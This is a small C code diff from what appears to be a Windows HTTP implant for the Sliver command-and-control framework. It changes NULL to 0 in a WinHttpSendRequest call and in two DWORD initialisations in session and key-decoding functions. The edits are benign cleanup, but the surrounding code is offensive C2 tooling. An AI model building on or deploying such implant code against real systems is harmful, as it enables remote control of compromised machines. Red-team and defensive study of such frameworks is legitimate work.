@@ -492,7 +492,7 @@ HINTERNET SendRequest
 	}
 
 	i = 0;
-	while (!WinHttpSendRequest(hRequest, NULL, 0, pRequest->lpData, pRequest->cbData, pRequest->cbData, NULL)) {
+	while (!WinHttpSendRequest(hRequest, NULL, 0, pRequest->lpData, pRequest->cbData, pRequest->cbData, 0)) {
 		dwLastError = GetLastError();
 		LogError(L"WinHttpSendRequest failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, dwLastError);
 		if (dwLastError == ERROR_WINHTTP_RESEND_REQUEST) {
@@ -1347,7 +1347,7 @@ PMINISIGN_PUB_KEY DecodeMinisignPublicKey
 	LPSTR* pSplittedArray = NULL;
 	DWORD cbSplittedArray = 0;
 	PBYTE pTemp = NULL;
-	DWORD cbTemp = NULL;
+	DWORD cbTemp = 0;
 	DWORD i = 0;
 
 	pSplittedArray = StrSplitNA(lpInput, "\n", 0, &cbSplittedArray);
@@ -1503,7 +1503,7 @@ PSLIVER_HTTP_CLIENT SliverSessionInit
 	BOOL bIsOk = FALSE;
 	PHTTP_RESP pResp = NULL;
 	PBYTE pDecodedResp = NULL;
-	DWORD cbDecodedResp = NULL;
+	DWORD cbDecodedResp = 0;
 	PHTTP_CLIENT pHttpClient = NULL;
 	PWEB_PROXY pProxyConfig = NULL;
 	LPSTR lpSessionId = NULL;
